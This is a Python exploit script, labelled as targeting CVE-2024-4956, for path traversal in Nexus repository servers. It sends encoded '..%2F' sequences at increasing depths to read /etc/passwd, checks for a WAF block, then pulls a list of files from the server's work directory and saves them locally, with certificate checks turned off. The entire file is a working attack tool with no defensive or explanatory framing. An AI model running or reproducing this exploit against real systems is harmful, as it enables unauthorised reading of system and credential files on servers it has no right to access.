import requests
import argparse
import sys
import os

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3'}

# Global variable to store the traversal start after initial test
traversal_start_global = None

def exploit_directory_traversal(base_url, file_path, proxy):
    global traversal_start_global
    encoded_file_path = file_path.replace("/", "%2F")
    
    # Construct the URL with the directory traversal payload
    payload = f"{traversal_start_global}{encoded_file_path}"
    url = f"{base_url}{payload}"
    
    try:
        # Display the current file path being tested
        print(f"[*] Testing: {file_path}")

        # Send the GET request
        if proxy is not None:
            proxies = {"http": proxy, "https": proxy}
            response = requests.get(url, headers=headers, proxies=proxies, verify=False)
        else:
            response = requests.get(url, headers=headers, verify=False)
        
        # Check if the request was successful
        if response.status_code == 200:
            if "Request Rejected" in response.text:
                print(f"[-] WAF blocked request for {file_path}!")
                return
            else:
                print(f"[+] Successfully accessed: {file_path}! Content:\n{response.text}")
                if not os.path.exists("output"):
                    os.makedirs("output")
                with open(f"output/{file_path.replace('/', '_')}", 'w', encoding='utf-8') as file:
                    file.write(response.text)
                    print(f"[+] Saved response to output/{file_path.replace('/', '_')}!")
        elif response.status_code == 404:
            print(f"[-] File {file_path} does not exist!")
        else:
            print(f"[-] Failed to access: {file_path}! Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

def test_directory_traversal(base_url, proxy, return_payload=False):
    traversal_start = "/%2F%2F%2F%2F%2F%2F%2F"
    traversal_increment = "..%2F"
    file_to_test = "etc%2Fpasswd"
    
    for depth in range(20):
        payload = traversal_start + (traversal_increment * depth) + file_to_test
        url = f"{base_url}{payload}"
        
        try:
            # Display the current payload being tested
            print(f"[*] Testing payload: {payload}")

            # Send the GET request
            if proxy is not None:
                proxies = {"http": proxy, "https": proxy}
                response = requests.get(url, headers=headers, proxies=proxies, verify=False)
            else:
                response = requests.get(url, headers=headers, verify=False)
            
            # Check if the request was successful
            if response.status_code == 200 and "root:" in response.text:
                print(f"[+] Server is vulnerable! Contents of /etc/passwd:\n{response.text}")
                if return_payload:
                    return traversal_start + (traversal_increment * depth).rstrip("%2F")
                return
            elif response.status_code == 404:
                print(f"[-] File not found at depth {depth}.")
            else:
                print(f"[-] Failed to access payload at depth {depth}. Status code: {response.status_code}")
        except Exception as e:
            print(f"An error occurred: {e}")
    
    print("[-] Server is not vulnerable to directory traversal.")
    return None

def main():
    global traversal_start_global

    # Set up argparse to handle command line arguments
    parser = argparse.ArgumentParser(description="CVE-2024-4956 Path Traversal Exploit Script")
    parser.add_argument("-f", "--file", help="Path to the text file containing a list of relative file paths to test based on the Nexus server installation path", default="paths.txt")
    parser.add_argument("-p", "--proxy", help="HTTP proxy string to use for requests (e.g. http://localhost:8080)", required=False)
    parser.add_argument("-u", "--url", help="Base URL of the target server", required=True)
    parser.add_argument("--test", action="store_true", help="Run the program in test mode to check for directory traversal vulnerability, then exit")
    parser.add_argument("-r", "--relative-path", help="Relative path for traversal tests (paths in the file provided to -f will be underneath this path)", default="/opt/sonatype/sonatype-work")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")  # Remove trailing slash from the base URL

    try:
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        if args.test:
            # Run the directory traversal test
            traversal_start_global = test_directory_traversal(base_url, args.proxy, return_payload=True)
        else:
            # Run the directory traversal test once to get the traversal start
            traversal_start_global = test_directory_traversal(base_url, args.proxy, return_payload=True)
            if traversal_start_global is None:
                print("[-] Exiting as the server is not vulnerable.")
                sys.exit(1)

            # Read the file paths from the text file
            file_list_path = args.file
            relative_path = args.relative_path.rstrip("/")
            with open(file_list_path, 'r') as file:
                relative_file_paths = file.readlines()
            
            # Construct full paths
            file_paths = [f'{relative_path}{path}' for path in relative_file_paths]
            
            # Remove any leading/trailing whitespace characters
            file_paths = [path.strip() for path in file_paths]

            # Iterate over each file path and attempt directory traversal
            for file_path in file_paths:
                if file_path:  # Ensure the line is not empty
                    exploit_directory_traversal(base_url, file_path, args.proxy)
    
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
